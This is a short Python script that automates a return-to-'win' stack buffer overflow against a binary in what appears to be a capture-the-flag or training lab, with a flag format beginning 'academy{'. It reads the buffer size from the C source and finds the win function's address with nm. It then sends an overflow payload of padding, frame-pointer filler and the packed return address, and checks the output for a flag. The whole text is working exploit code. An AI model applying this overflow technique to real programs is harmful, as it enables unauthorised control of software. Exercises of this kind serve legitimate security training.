import subprocess, re, sys, os, glob, struct, time

os.chdir(os.path.expanduser("~"))
subprocess.run(["./start"], capture_output=True, timeout=30)
cs = sorted(glob.glob("*.c"), key=os.path.getmtime)
if not cs:
    print("pas de .c"); sys.exit(1)
srcfile = cs[-1]
binname = srcfile[:-2]
code = open(srcfile).read()
m = re.search(r"#define\s+BUFSIZE\s+(\d+)", code)
bufsize = int(m.group(1)) if m else 78
print("src:", srcfile, "bin:", binname, "BUFSIZE:", bufsize)

nm = subprocess.run(["nm", binname], capture_output=True, text=True).stdout
off = {}
for line in nm.splitlines():
    parts = line.split()
    if len(parts) == 3 and parts[1] in ("T", "t"):
        off[parts[2]] = int(parts[0], 16)
win_off = off.get("win")
print("win:", hex(win_off) if win_off else None)

f = subprocess.run(["file", binname], capture_output=True, text=True).stdout
is64 = "64-bit" in f
print("64-bit:", is64)
pck = struct.pack("<Q" if is64 else "<I", win_off)
rbp = b"B" * (8 if is64 else 4)

for rbp_len in (8, 4):
    payload = b"A" * bufsize + b"B" * rbp_len + (struct.pack("<Q" if is64 else "<I", win_off))
    p2 = subprocess.Popen(["./" + binname], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    p2.stdin.write(payload + b"\n")
    p2.stdin.flush()
    p2.stdin.close()
    try:
        res = p2.stdout.read()
    except Exception:
        res = b""
    txt = res.decode("utf-8", "replace")
    print(f"--- rbp_len={rbp_len} (is64={is64}) ---")
    print(txt[:300])
    if "academy{" in txt or "{" in txt:
        break
